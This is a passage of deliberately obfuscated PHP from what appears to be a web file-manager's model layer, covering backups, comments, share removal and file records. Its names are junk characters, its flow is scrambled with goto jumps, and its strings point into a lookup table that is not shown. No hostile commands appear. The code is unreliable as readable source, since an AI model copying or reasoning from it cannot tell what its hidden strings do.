$Dœ‚ß¬Í[$d¡—Š§‰ù½]; $d¤¥¹êÛ©Õ[$aø™‡ÛÀ¼[6]] = json_decode($d¤¥¹êÛ©Õ[$aø™‡ÛÀ¼[6]], !0); return $d¤¥¹êÛ©Õ; } public function remove($dŞÌ¢®ô‰µ) { $this->removeShareItems($dŞÌ¢®ô‰µ); return parent::remove($dŞÌ¢®ô‰µ); } public function removeWithFile($dŒ–ç¸Ú¨, $f¯Á³²¶Œ) { goto EÑ´õ³ó‡¢; EÑ´õ³ó‡¢: $fÉ™‹öİî =& $_SERVER[úÎü]; $F—‹÷­ÑÎ¶ = array($fÉ™‹öİî[744] => $dŒ–ç¸Ú¨); $F²˜²¨“æ­ = Model($fÉ™‹öİî[438])->where($F—‹÷­ÑÎ¶)->count(); goto AÃ©ØÁ¶ˆÑ; C§’‰„ ³: $b‹âóœ‰Í->task[$fÉ™‹öİî[699]] = (double) $D¼á¦§ëÆ; $cË£µ¹ˆÑİ = KodIO::defaultDriver(); $c›Ô‹Ú†Ùñ = $cË£µ¹ˆÑİ[$fÉ™‹öİî[383]]; goto B˜»İ¢Œëá; AÃ©ØÁ¶ˆÑ: $D¼á¦§ëÆ = Model($fÉ™‹öİî[438])->where($F—‹÷­ÑÎ¶)->sum($fÉ™‹öİî[77]); $d¾‰àº¤ëÒ = $f¯Á³²¶Œ . $fÉ™‹öİî[1952] . $dŒ–ç¸Ú¨; $b‹âóœ‰Í = new TaskFileTransfer($d¾‰àº¤ëÒ, $fÉ™‹öİî[1947], $F²˜²¨“æ­, LNG($fÉ™‹öİî[1953]) . "\x28{$dŒ–ç¸Ú¨}\x29"); goto C§’‰„ ³; Eõ¨º’­¸: if (!$D«ñĞ³™‚) { $b‹âóœ‰Í->stop($d¾‰àº¤ëÒ); return !1; } $b‹âóœ‰Í->end(); if ($f¯Á³²¶Œ == $fÉ™‹öİî[1610]) { $this->remove($dŒ–ç¸Ú¨); } goto f“îÙÃ™ÚÌ; e¬ŠŠ§†˜: $b­Ú…âùÀÑ = Model($fÉ™‹öİî[171])->where($F—‹÷­ÑÎ¶)->field($fÉ™‹öİî[1954])->select(); foreach ($b­Ú…âùÀÑ as $FÅÍ‚¸÷Œ) { goto DÊù¿Úì–™; EËØŸÁ©±è: $CíâëÀ‚’¤ = array($fÉ™‹öİî[744] => $c›Ô‹Ú†Ùñ, $fÉ™‹öİî[75] => $BÔ‹Ö¥Ğ†À); Model($fÉ™‹öİî[171])->where($F—‹÷­ÑÎ¶)->save($CíâëÀ‚’¤); goto aêÌ•¥Ìªª; d…íƒ¤ÎŠÂ: if (IO::exist($BÔ‹Ö¥Ğ†À)) { $b‹âóœ‰Í->updateFileEnd($FÅÍ‚¸÷Œ[$fÉ™‹öİî[28]], $FÅÍ‚¸÷Œ[$fÉ™‹öİî[77]]); continue; } if (!IO::move($FáÊç–«µ„, get_path_father($BÔ‹Ö¥Ğ†À))) { $D«ñĞ³™‚ = !1; break; } $F—‹÷­ÑÎ¶ = array($fÉ™‹öİî[435] => $FÅÍ‚¸÷Œ[$fÉ™‹öİî[435]]); goto EËØŸÁ©±è; DÊù¿Úì–™: $FáÊç–«µ„ = $FÅÍ‚¸÷Œ[$fÉ™‹öİî[75]]; $BÔ‹Ö¥Ğ†À = $a¦É…ÈÓ‹Û . str_replace("\x7b\151\157\x3a{$dŒ–ç¸Ú¨}\x7d\57", $fÉ™‹öİî[33], $FáÊç–«µ„); if (!IO::exist($FáÊç–«µ„)) { $BÃ‰»¨ïÔ…[] = $FÅÍ‚¸÷Œ[$fÉ™‹öİî[435]]; $b‹âóœ‰Í->updateFileEnd($FÅÍ‚¸÷Œ[$fÉ™‹öİî[28]], $FÅÍ‚¸÷Œ[$fÉ™‹öİî[77]]); continue; } goto d…íƒ¤ÎŠÂ; aêÌ•¥Ìªª: } $this->removeByFileID($BÃ‰»¨ïÔ…); goto Eõ¨º’­¸; B˜»İ¢Œëá: $a¦É…ÈÓ‹Û = "\x7b\x69\x6f\x3a{$c›Ô‹Ú†Ùñ}\175\x2f"; $D«ñĞ³™‚ = !0; $BÃ‰»¨ïÔ… = array(); goto e¬ŠŠ§†˜; f“îÙÃ™ÚÌ: } public function progress($Däéá­åÃ§, $C÷‡ò¤‡•¦) { return Task::get($C÷‡ò¤‡•¦ . $_SERVER[úÎü][1952] . $Däéá­åÃ§); } private function removeByFileID($D•Š²†áˆ“ = array()) { goto FàÃë«î±¹; FàÃë«î±¹: $dÀºù—Õ‡ô =& $_SERVER[úÎü]; if (empty($D•Š²†áˆ“)) { return; } $dÜ™•¸†¾Ö = array($dÀºù—Õ‡ô[435] => array($dÀºù—Õ‡ô[7], $D•Š²†áˆ“)); goto c“ñè« Ç­; c“ñè« Ç­: $bÒâµƒôï = Model($dÀºù—Õ‡ô[1162])->where($dÜ™•¸†¾Ö)->field($dÀºù—Õ‡ô[385])->select(); if (!$bÒâµƒôï) { return; } $bÒâµƒôï = array_to_keyvalue($bÒâµƒôï, $dÀºù—Õ‡ô[33], $dÀºù—Õ‡ô[385]); goto C×¿¼òò“»; C×¿¼òò“»: foreach ($bÒâµƒôï as $bÈ²–ÙšºÈ) { Model($dÀºù—Õ‡ô[398])->removeNow($bÈ²–ÙšºÈ, !1); } goto BÓ»·²ª‹Ô; BÓ»·²ª‹Ô: } private function removeShareItems($CÏ¤ä´¾ùë) { goto e¹ÂìÊë‡Ç; cˆ°½ãíÏ: $eÅÖ×ïô…á = Model($A„×ÉÎß¶•[1621])->where($cÂå¢Şƒ¡Ø)->field($A„×ÉÎß¶•[456])->select(); if (empty($eÅÖ×ïô…á)) { return; } $Cé†ÛŠ†œÒ = array_to_keyvalue($eÅÖ×ïô…á, $A„×ÉÎß¶•[33], $A„×ÉÎß¶•[456]); goto A‹×‚ÁÅ¬; e¹ÂìÊë‡Ç: $A„×ÉÎß¶• =& $_SERVER[úÎü]; $bƒ¢¾ä‹ø¬ = "\173\x69\157\x3a{$CÏ¤ä´¾ùë}\175\57"; $cÂå¢Şƒ¡Ø = array($A„×ÉÎß¶•[385] => 0, $A„×ÉÎß¶•[1031] => array($A„×ÉÎß¶•[373], "{$bƒ¢¾ä‹ø¬}\45")); goto cˆ°½ãíÏ; A‹×‚ÁÅ¬: Model($A„×ÉÎß¶•[552])->remove($Cé†ÛŠ†œÒ); goto A©ÏŒº·çŠ; A©ÏŒº·çŠ: } } goto bÒ˜ê³; a¯êÊèêğ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x62\x61\x63\x6b\x75\160\x4c\x69\x73\x74"; public $field = array("\151\157", "\x6e\x61\x6d\x65", "\163\x74\x61\164\x75\x73", "\x63\157\156\x74\145\x6e\164", "\162\145\163\x75\x6c\164", "\164\x69\x6d\x65\x46\x72\157\x6d", "\x74\151\155\145\124\x6f"); public function config() { goto b‚ãÁ–Â Á; b‚ãÁ–Â Á: $eç•¢ªÔ¥Ã =& $_SERVER[úÎü]; $E°÷ù¹ò¢Œ = Model($eç•¢ªÔ¥Ã[1083])->get($eç•¢ªÔ¥Ã[714]); $E°÷ù¹ò¢Œ = json_decode($E°÷ù¹ò¢Œ, !0); goto dŞÉ·Òçó¡; eåÊÙë×°¶: Action($eç•¢ªÔ¥Ã[1668])->taskInit(); $Fñ¦ˆšŸ£ = Model($eç•¢ªÔ¥Ã[1669])->listData(); foreach ($Fñ¦ˆšŸ£ as $bÎÇ²’£  ) { if ($bÎÇ²’£  [$eç•¢ªÔ¥Ã[1126]] == $eç•¢ªÔ¥Ã[83] && $bÎÇ²’£  [$eç•¢ªÔ¥Ã[1474]] == $eç•¢ªÔ¥Ã[1670]) { $E²›ŒôßÉÖ = $bÎÇ²’£  ; break; } } goto dœÊ„‰äß ; dœÊ„‰äß : if (isset($E²›ŒôßÉÖ[$eç•¢ªÔ¥Ã[193]])) { $E²›ŒôßÉÖ[$eç•¢ªÔ¥Ã[193]] = json_decode($E²›ŒôßÉÖ[$eç•¢ªÔ¥Ã[193]], !0); } if (isset($E°÷ù¹ò¢Œ[$eç•¢ªÔ¥Ã[193]])) { $E²›ŒôßÉÖ[$eç•¢ªÔ¥Ã[193]][$eç•¢ªÔ¥Ã[1459]] = $E°÷ù¹ò¢Œ[$eç•¢ªÔ¥Ã[193]]; unset($E°÷ù¹ò¢Œ[$eç•¢ªÔ¥Ã[193]]); } return array_merge($E²›ŒôßÉÖ, $E°÷ù¹ò¢Œ); goto DÆÓ »ƒÃ„; dŞÉ·Òçó¡: $E°÷ù¹ò¢Œ = is_array($E°÷ù¹ò¢Œ) ? $E°÷ù¹ò¢Œ : array(); if (!isset($E°÷ù¹ò¢Œ[$eç•¢ªÔ¥Ã[693]])) { $E°÷ù¹ò¢Œ[$eç•¢ªÔ¥Ã[693]] = $eç•¢ªÔ¥Ã[83]; } $E²›ŒôßÉÖ = array(); goto eåÊÙë×°¶; DÆÓ »ƒÃ„: } public function listData($BË§é•¢¤ã = false, $aÇÖ£îÌ‘Ã = "\155\x6f\x64\151\x66\171\124\151\155\x65", $eË„œƒ» = false) { return parent::listData($BË§é•¢¤ã, $aÇÖ£îÌ‘Ã, !0); } public function lastItem() { $fÅÌèš»İ = $this->listData(); return !empty($fÅÌèš»İ[0]) ? $fÅÌèš»İ[0] : null; } public function kill($E¬¡³¬ƒá) { goto cÅÁÄ‰ïØ; EòÁ­ŸòÊ‘: $fÙÖ¹Åìç• = $A»Í¥‰Ëñë[$eé™‰âÛ©˜[28]]; $c­‡¶Ê¡Òò = TEMP_FILES . $eé™‰âÛ©˜[710] . $fÙÖ¹Åìç• . $eé™‰âÛ©˜[8]; IO::remove($c­‡¶Ê¡Òò, !1); goto EªÑ¡éÜ¥; EªÑ¡éÜ¥: return $this->remove($E¬¡³¬ƒá); goto b¢ƒŠĞìßÆ; bâ•Á“Œ‰ó: Task::kill($eé™‰âÛ©˜[713]); Task::kill($eé™‰âÛ©˜[730]); Task::kill($eé™‰âÛ©˜[737]); goto EòÁ­ŸòÊ‘; cÅÁÄ‰ïØ: $eé™‰âÛ©˜ =& $_SERVER[úÎü]; $A»Í¥‰Ëñë = $this->listData($E¬¡³¬ƒá); if (!$A»Í¥‰Ëñë || empty($A»Í¥‰Ëñë[$eé™‰âÛ©˜[28]])) { return !0; } goto bâ•Á“Œ‰ó; b¢ƒŠĞìßÆ: } public function remove($e’Ü±Ÿ¤) { $A ö«Ó˜ßî = $this->listData($e’Ü±Ÿ¤); if (!$A ö«Ó˜ßî) { return !0; } return $this->backupRemove($A ö«Ó˜ßî); } private function backupRemove($EÈàî™ªöç) { $cåõš¡¥ç =& $_SERVER[úÎü]; parent::remove($EÈàî™ªöç[$cåõš¡¥ç[383]]); $fÎ¶‡ÚÌì½ = "\x7b\151\x6f\x3a{$EÈàî™ªöç[$cåõš¡¥ç[692]]}\175\x2f\144\141\x74\x61\x62\141\x73\x65\57\x62\141\143\x6b\165\x70\137" . $EÈàî™ªöç[$cåõš¡¥ç[28]]; IO::remove($fÎ¶‡ÚÌì½, !1); return !0; } public function start() { goto EŞÑñŞ‚”š; c²ï„¢ò: if (!$cĞ¢ÖÒÅØ || $cĞ¢ÖÒÅØ[$C¶Ñ¯Õİ‘[1456]] != $C¶Ñ¯Õİ‘[83]) { return !1; } $aĞø‹’ªÀë = $this->process(); foreach ($aĞø‹’ªÀë as $B†É¨“‹Æ) { if ($B†É¨“‹Æ) { return Task::restart($B†É¨“‹Æ[$C¶Ñ¯Õİ‘[383]]); } } goto Aˆ‡÷á±öİ; EŞÑñŞ‚”š: $C¶Ñ¯Õİ‘ =& $_SERVER[úÎü]; if ($GLOBALS[$C¶Ñ¯Õİ‘[6]][$C¶Ñ¯Õİ‘[84]][$C¶Ñ¯Õİ‘[1671]] != $C¶Ñ¯Õİ‘[83]) { return !0; } $cĞ¢ÖÒÅØ = $this->config(); goto c²ï„¢ò; Aˆ‡÷á±öİ: $Dš‘çìˆÉ = new Backup(); $Dš‘çìˆÉ->keep(); $dœÓº¡Ç²š = $Dš‘çìˆÉ->db(); goto b­ª¢¦ÑÎ½; b­ª¢¦ÑÎ½: if ($dœÓº¡Ç²š) { $dœÓº¡Ç²š = $Dš‘çìˆÉ->dbFile(); if ($dœÓº¡Ç²š && $cĞ¢ÖÒÅØ[$C¶Ñ¯Õİ‘[693]] == $C¶Ñ¯Õİ‘[485]) { $dœÓº¡Ç²š = $Dš‘çìˆÉ->file(); } } Backup::set(array($C¶Ñ¯Õİ‘[690] => 1, $C¶Ñ¯Õİ‘[464] => time())); return !0; goto d·ÁÄë‘Šé; d·ÁÄë‘Šé: } public function process() { $dÈƒéÛ¼£Â =& $_SERVER[úÎü]; return array($dÈƒéÛ¼£Â[695] => Task::get($dÈƒéÛ¼£Â[713]), $dÈƒéÛ¼£Â[698] => Task::get($dÈƒéÛ¼£Â[730]), $dÈƒéÛ¼£Â[171] => Task::get($dÈƒéÛ¼£Â[737])); } public function restore() { $d†‘ˆñÑ‹È =& $_SERVER[úÎü]; ActionCall($d†‘ˆñÑ‹È[979], !0, 1); ActionCall($d†‘ˆñÑ‹È[979], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\145" => "\x63\x6f\155\155\145\x6e\x74\137\x6d\x65\164\x61", "\x6d\145\164\141\x46\151\x65\154\x64" => "\x63\157\x6d\155\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($bÚ´Àñğê¤) { $F…ìô‹×Ş™ =& $_SERVER[úÎü]; if ($bÚ´Àñğê¤[$F…ìô‹×Ş™[1672]]) { $EÜÑïôœÖ¶ = $this->where(array($F…ìô‹×Ş™[1673] => $bÚ´Àñğê¤[$F…ìô‹×Ş™[1672]]))->find(); if (!$EÜÑïôœÖ¶ || $EÜÑïôœÖ¶[$F…ìô‹×Ş™[387]] != $bÚ´Àñğê¤[$F…ìô‹×Ş™[387]] || $EÜÑïôœÖ¶[$F…ìô‹×Ş™[473]] != $bÚ´Àñğê¤[$F…ìô‹×Ş™[473]]) { return !1; } $this->where(array($F…ìô‹×Ş™[1673] => $bÚ´Àñğê¤[$F…ìô‹×Ş™[1672]]))->setAdd($F…ìô‹×Ş™[1674], 1); } $bÚ´Àñğê¤[$F…ìô‹×Ş™[1675]] = 0; $bÚ´Àñğê¤[$F…ìô‹×Ş™[1674]] = 0; $bÚ´Àñğê¤[$F…ìô‹×Ş™[690]] = 1; return $this->add($bÚ´Àñğê¤); } public function commentCount($DÀ£ äŸ´™, $d˜í¢‡ãÓ) { goto bÑÏ–óƒ…ß; FèÈ•Â‘¬: return array_to_keyvalue($FÍ™‘×ä•¯, $f…¹¥îºØƒ[473], $f…¹¥îºØƒ[1677]); goto eí‹ŠèÆ‡è; bÑÏ–óƒ…ß: $f…¹¥îºØƒ =& $_SERVER[úÎü]; if (!$DÀ£ äŸ´™) { return array(); } if (is_string($DÀ£ äŸ´™) || is_int($DÀ£ äŸ´™)) { $DÀ£ äŸ´™ = array($DÀ£ äŸ´™); } goto eÎ™ŸÍ‡çø; eÎ™ŸÍ‡çø: $AÎ°Ûƒ¦Üë = $f…¹¥îºØƒ[1676]; $d¿­›Ÿ£Ã÷ = array($f…¹¥îºØƒ[473] => array($f…¹¥îºØƒ[7], $DÀ£ äŸ´™), $f…¹¥îºØƒ[387] => $d˜í¢‡ãÓ); $FÍ™‘×ä•¯ = $this->field($AÎ°Ûƒ¦Üë)->where($d¿­›Ÿ£Ã÷)->group($f…¹¥îºØƒ[473])->select(); goto FèÈ•Â‘¬; eí‹ŠèÆ‡è: } public function remove($BƒÈç ö¾) { $DŠ’¿Ä‰ŞÜ =& $_SERVER[úÎü]; $cœã©îÏ¾ = array($DŠ’¿Ä‰ŞÜ[1673] => $BƒÈç ö¾); $FÛ–‰œ÷ƒ = $this->where($cœã©îÏ¾)->find(); if ($FÛ–‰œ÷ƒ[$DŠ’¿Ä‰ŞÜ[1672]]) { $this->where(array($DŠ’¿Ä‰ŞÜ[1673] => $FÛ–‰œ÷ƒ[$DŠ’¿Ä‰ŞÜ[1672]]))->setAdd($DŠ’¿Ä‰ŞÜ[1674], -1); } return $this->where($cœã©îÏ¾)->delete(); } public function edit($DĞÉ¦ñØæÍ, $B‡ùé”Ù”) { $Fá¿†ÖØ˜ =& $_SERVER[úÎü]; $eŸºÔÎÃâ = array($Fá¿†ÖØ˜[1673] => $DĞÉ¦ñØæÍ); return $this->where($eŸºÔÎÃâ)->save(array($Fá¿†ÖØ˜[1678] => $B‡ùé”Ù”)); } public function prasise($f¸Ô‘ò­¼Ü) { $a«¸éÁÓ =& $_SERVER[úÎü]; $a‘ Ô»Ø« = Model($a«¸éÁÓ[1679]); $eïÎÃò¯ùã = array($a«¸éÁÓ[1673] => $f¸Ô‘ò­¼Ü, $a«¸éÁÓ[1477] => USER_ID); $d­›È‘¬éŒ = $a‘ Ô»Ø«->where($eïÎÃò¯ùã)->find(); if (!$d­›È‘¬éŒ) { $a‘ Ô»Ø«->add($eïÎÃò¯ùã); $c¤…ôÚéƒ“ = $this->where(array($a«¸éÁÓ[1673] => $f¸Ô‘ò­¼Ü))->setAdd($a«¸éÁÓ[1675], 1); } else { $a‘ Ô»Ø«->where($eïÎÃò¯ùã)->delete(); $c¤…ôÚéƒ“ = $this->where(array($a«¸éÁÓ[1673] => $f¸Ô‘ò­¼Ü))->setAdd($a«¸éÁÓ[1675], -1); } return $c¤…ôÚéƒ“; } public function targetInfo($fö—¼¯ÀÌİ, $e¢©ÎÆ“Ä¥) { goto d¼êæ Œ½; dÊ´ƒÅîÌ: $A±»ëŸ‰ôÖ = "\122\111\107\110\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x63\157\x6d\x6d\x65\x6e\x74\x5f\160\x72\141\x69\163\x65\x20\x73\164\x61\162\40\x6f\x6e\x20\x63\x6f\x6d\x6d\145\156\164\56\x63\157\155\x6d\x65\156\x74\111\104\x20\75\x20\163\x74\x61\162\x2e\x63\x6f\x6d\155\145\x6e\x74\x49\x44"; $c¬ñˆ¯ØŠ‘ = $this->alias($cÑô’›ëØÎ[348])->where($Cµ»òÃë¯)->join($A±»ëŸ‰ôÖ, $cÑô’›ëØÎ[1680])->count(); $D´ø‘†ÜÔÜ = array($cÑô’›ëØÎ[1681] => $F¨¶¿»ì¼, $cÑô’›ëØÎ[1682] => $c¬ñˆ¯ØŠ‘); goto aé©×·Ã×ã; aé©×·Ã×ã: return $D´ø‘†ÜÔÜ; goto eš¹ÜÃç‰; d¼êæ Œ½: $cÑô’›ëØÎ =& $_SERVER[úÎü]; $Cµ»òÃë¯ = array($cÑô’›ëØÎ[538] => $fö—¼¯ÀÌİ, $cÑô’›ëØÎ[539] => $e¢©ÎÆ“Ä¥); $F¨¶¿»ì¼ = $this->where($Cµ»òÃë¯)->count(); goto dÊ´ƒÅîÌ; eš¹ÜÃç‰: } public function listData($fŒµ÷ğë‰) { $CªàÕäà• =& $_SERVER[úÎü]; if (isset($fŒµ÷ğë‰[$CªàÕäà•[1683]])) { if ($fŒµ÷ğë‰[$CªàÕäà•[1683]]) { $fŒµ÷ğë‰[$CªàÕäà•[1684]] = array($CªàÕäà•[932], intval($fŒµ÷ğë‰[$CªàÕäà•[1683]])); } unset($fŒµ÷ğë‰[$CªàÕäà•[1683]]); } if (isset($fŒµ÷ğë‰[$CªàÕäà•[1685]])) { if ($fŒµ÷ğë‰[$CªàÕäà•[1685]]) { $fŒµ÷ğë‰[$CªàÕäà•[1684]] = array($CªàÕäà•[929], intval($fŒµ÷ğë‰[$CªàÕäà•[1685]])); } unset($fŒµ÷ğë‰[$CªàÕäà•[1685]]); } return $this->_listData($fŒµ÷ğë‰); } private function _listData($B¿íáêÕ¦¶) { $FÎËÆæ‚ª¯ =& $_SERVER[úÎü]; $a¢™’šœòñ = $this->where($B¿íáêÕ¦¶)->_makeOrder()->selectPage(100); $this->_listAppendParent($a¢™’šœòñ[$FÎËÆæ‚ª¯[361]]); $this->_listAppendUser($a¢™’šœòñ[$FÎËÆæ‚ª¯[361]]); $this->_listAppendMeta($a¢™’šœòñ[$FÎËÆæ‚ª¯[361]]); return $a¢™’šœòñ; } private function _makeOrder() { $fŞàã¹ÙÜÁ =& $_SERVER[úÎü]; $Cóã‹¬’—… = array($fŞàã¹ÙÜÁ[1675], $fŞàã¹ÙÜÁ[1674], $fŞàã¹ÙÜÁ[190]); $CèîÉ·£æÆ = Input::get($fŞàã¹ÙÜÁ[423], $fŞàã¹ÙÜÁ[7], $fŞàã¹ÙÜÁ[405], $Cóã‹¬’—…); $bÃÄÍÔÖÍÇ = Input::get($fŞàã¹ÙÜÁ[424], $fŞàã¹ÙÜÁ[7], $fŞàã¹ÙÜÁ[1479], array($fŞàã¹ÙÜÁ[1686], $fŞàã¹ÙÜÁ[421])); $eâŞ öâÈ¢ = $CèîÉ·£æÆ . $fŞàã¹ÙÜÁ[50] . $bÃÄÍÔÖÍÇ; return $this->order($eâŞ öâÈ¢); } private function _listAppendParent(&$c¨Ã ’Ë†) { goto b»¯Ÿ²Ôêº; b»¯Ÿ²Ôêº: $fğƒ­˜ÃŸ§ =& $_SERVER[úÎü]; $B«Æğ§š¥ä = array_unique(array_to_keyvalue($c¨Ã ’Ë†, $fğƒ­˜ÃŸ§[33], $fğƒ­˜ÃŸ§[1672])); $B«Æğ§š¥ä = array_remove_value($B«Æğ§š¥ä, $fğƒ­˜ÃŸ§[485]); goto dÕÙóƒôï; dÕÙóƒôï: if (!$B«Æğ§š¥ä) { return; } $CÄ«Ëºôíƒ = $this->where(array($fğƒ­˜ÃŸ§[1673] => array($fğƒ­˜ÃŸ§[7], $B«Æğ§š¥ä)))->select(); $CÄ«Ëºôíƒ = array_to_keyvalue($CÄ«Ëºôíƒ, $fğƒ­˜ÃŸ§[1684]); goto e¿‘¤Ÿ³±; e¿‘¤Ÿ³±: foreach ($c¨Ã ’Ë† as &$aÖĞ²è³ï) { if (isset($CÄ«Ëºôíƒ[$aÖĞ²è³ï[$fğƒ­˜ÃŸ§[1672]]])) { $aÖĞ²è³ï[$fğƒ­˜ÃŸ§[1687]] = $CÄ«Ëºôíƒ[$aÖĞ²è³ï[$fğƒ­˜ÃŸ§[1672]]]; } } unset($aÖĞ²è³ï); goto B§”œÛ’Î¯; B§”œÛ’Î¯: } private function _listAppendUser(&$e²Óàùš§‹) { goto F¡ä¿š°–ù; F¡ä¿š°–ù: $F˜ãŸ’Şİ™ =& $_SERVER[úÎü]; $cĞ„¼½¼¾ = array_unique(array_to_keyvalue($e²Óàùš§‹, $F˜ãŸ’Şİ™[33], $F˜ãŸ’Şİ™[1485])); $cĞ„¼½¼¾ = array_remove_value($cĞ„¼½¼¾, $F˜ãŸ’Şİ™[485]); goto a„¯áßŠÁ; CË³……¯š: foreach ($e²Óàùš§‹ as &$Eè–Ü´œõ) { $Eè–Ü´œõ[$F˜ãŸ’Şİ™[551]] = $b¼Åè¡¤È[$Eè–Ü´œõ[$F˜ãŸ’Şİ™[1485]]]; if (isset($Eè–Ü´œõ[$F˜ãŸ’Şİ™[1687]])) { $Eè–Ü´œõ[$F˜ãŸ’Şİ™[1687]][$F˜ãŸ’Şİ™[551]] = $b¼Åè¡¤È[$Eè–Ü´œõ[$F˜ãŸ’Şİ™[1687]][$F˜ãŸ’Şİ™[1485]]]; } } unset($Eè–Ü´œõ); goto Aä­¿Ã–ê±; a„¯áßŠÁ: if (count($cĞ„¼½¼¾) == 0) { return; } foreach ($e²Óàùš§‹ as $Eè–Ü´œõ) { if (isset($Eè–Ü´œõ[$F˜ãŸ’Şİ™[1687]])) { $cĞ„¼½¼¾[] = $Eè–Ü´œõ[$F˜ãŸ’Şİ™[1687]][$F˜ãŸ’Şİ™[1485]]; } } $b¼Åè¡¤È = Model($F˜ãŸ’Şİ™[494])->userListInfo($cĞ„¼½¼¾); goto CË³……¯š; Aä­¿Ã–ê±: } private function _listAppendMeta(&$D¡çâÚÂŞÜ) { goto fÈ‰Ü¢„¬½; c¼Ï¸‡˜êä: if (!$E´Ó™Õµµ) { return; } foreach ($D¡çâÚÂŞÜ as $eô£Ôõ†¨›) { if (isset($eô£Ôõ†¨›[$d¥ÈÁ¡”»”[1687]])) { $E´Ó™Õµµ[] = $eô£Ôõ†¨›[$d¥ÈÁ¡”»”[1687]][$d¥ÈÁ¡”»”[1684]]; } } $d‘ÓÒ³¿¡ = $this->metaList($E´Ó™Õµµ); goto b©Ù ÷‰ç; fÈ‰Ü¢„¬½: $d¥ÈÁ¡”»” =& $_SERVER[úÎü]; $E´Ó™Õµµ = array_unique(array_to_keyvalue($D¡çâÚÂŞÜ, $d¥ÈÁ¡”»”[33], $d¥ÈÁ¡”»”[1684])); $E´Ó™Õµµ = array_remove_value($E´Ó™Õµµ, $d¥ÈÁ¡”»”[485]); goto c¼Ï¸‡˜êä; b©Ù ÷‰ç: if (!$d‘ÓÒ³¿¡) { return !1; } foreach ($D¡çâÚÂŞÜ as &$eô£Ôõ†¨›) { $eô£Ôõ†¨›[$d¥ÈÁ¡”»”[433]] = $d‘ÓÒ³¿¡[$eô£Ôõ†¨›[$d¥ÈÁ¡”»”[1684]]]; if (isset($eô£Ôõ†¨›[$d¥ÈÁ¡”»”[1687]])) { $eô£Ôõ†¨›[$d¥ÈÁ¡”»”[1687]][$d¥ÈÁ¡”»”[433]] = $d‘ÓÒ³¿¡[$eô£Ôõ†¨›[$d¥ÈÁ¡”»”[1687]][$d¥ÈÁ¡”»”[1684]]]; } } unset($eô£Ôõ†¨›); goto eõÚïğ ¥´; eõÚïğ ¥´: } private function metaList($dùÙ®ÑÊ¡œ) { goto AìÏ•š˜¹±; AÅÈâ×ÅŒ: return $fßÆ–øöì¼ ? $fßÆ–øöì¼ : array(); goto eÊƒäÖŒ›–; AìÏ•š˜¹±: $côˆº”­åï =& $_SERVER[úÎü]; if (!$dùÙ®ÑÊ¡œ) { return array(); } $dÁï¦›íõ§ = array($côˆº”­åï[1684] => array($côˆº”­åï[7], $dùÙ®ÑÊ¡œ)); goto BÉíÓëÊšŒ; BÉíÓëÊšŒ: $fßÆ–øöì¼ = Model($côˆº”­åï[1688])->where($dÁï¦›íõ§)->select(); $fßÆ–øöì¼ = array_to_keyvalue_group($fßÆ–øöì¼, $côˆº”­åï[1684]); foreach ($fßÆ–øöì¼ as $cÎÓÇÅÂà² => $bõŸÂïÛŞ) { $eôÂÅàó×¶ = array(); foreach ($bõŸÂïÛŞ as $Aà£¶ò‰”) { $eôÂÅàó×¶[$Aà£¶ò‰”[$côˆº”­åï[89]]] = $Aà£¶ò‰”[$côˆº”­åï[366]]; } $fßÆ–øöì¼[$cÎÓÇÅÂà²] = $eôÂÅàó×¶; } goto AÅÈâ×ÅŒ; eÊƒäÖŒ›–: } } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\145" => "\x69\157\137\146\x69\x6c\145\x5f\x6d\x65\x74\x61", "\x6d\x65\x74\x61\106\151\x65\154\x64" => "\x66\x69\x6c\x65\111\104"); public function fileInfo($c·©‰Ïé‘½) { $FÓš¡¯°ã¦ =& $_SERVER[úÎü]; static $cçß£´‡†´ = array(); if (!isset($cçß£´‡†´[$c·©‰Ïé‘½])) { $f„®ÄÚÑŒ¸ = $FÓš¡¯°ã¦[1689]; $dö…„çàÙÄ = Model($FÓš¡¯°ã¦[438])->field($f„®ÄÚÑŒ¸)->where(array($FÓš¡¯°ã¦[436] => $c·©‰Ïé‘½))->find(); $cçß£´‡†´[$c·©‰Ïé‘½] = $dö…„çàÙÄ; } return $cçß£´‡†´[$c·©‰Ïé‘½]; } public function addFileByContent($cÍŒ¥‚­Å = '', $a³´ƒîÒ× = '') { goto eµ ‘ÂÀ ì; eµ ‘ÂÀ ì: $d´ãê×ªÂ™ =& $_SERVER[úÎü]; $e›øâ°‰ = TEMP_PATH . $d´ãê×ªÂ™[1690]; if (!is_dir($e›øâ°‰)) { mk_dir($e›øâ°‰); } goto AŸêŸ²ë†; AŸêŸ²ë†: $cÕ„·‘¨¦î = $e›øâ°‰ . $d´ãê×ªÂ™[1691] . rand_string(16); file_put_contents($cÕ„·‘¨¦î, $cÍŒ¥‚­Å); $CŞ…’ºß¹ = $this->addFile($cÕ„·‘¨¦î, $a³´ƒîÒ×, !0); goto Cİô™Çá“º; Cİô™Çá“º: if (file_exists($cÕ„·‘¨¦î)) { @unlink($cÕ„·‘¨¦î); } return $CŞ…’ºß¹; goto d² ’£íî; d² ’£íî: } public function createFileName($FÅÑ±Áêåí) { goto d¨•ÕÖíİÅ; A·ŒèòÍ´Õ: if (!$Eº›³Çíñ && !Cache::get($e¹˜‚ö¢)) { $Eº›³Çíñ = !0; $CÎ²¤Æ…ÚÇ = IO::mkdir($cãæù…è£); if (!IO::exist($CÎ²¤Æ…ÚÇ . $cëãäŠò™[1693])) { IO::mkfile($CÎ²¤Æ…ÚÇ . $cëãäŠò™[1693]); } Cache::set($e¹˜‚ö¢, 1, 3600 * 2); } return $Dî›½›…©; goto f®•Ì‚„Ú; Fà¬ƒØ£í¸: $cãæù…è£ = $eÎñ‡âĞğ ->pathFather($Dî›½›…©); static $Eº›³Çíñ = false; $e¹˜‚ö¢ = $cëãäŠò™[1692] . md5($cãæù…è£); goto A·ŒèòÍ´Õ; d¨•ÕÖíİÅ: $cëãäŠò™ =& $_SERVER[úÎü]; 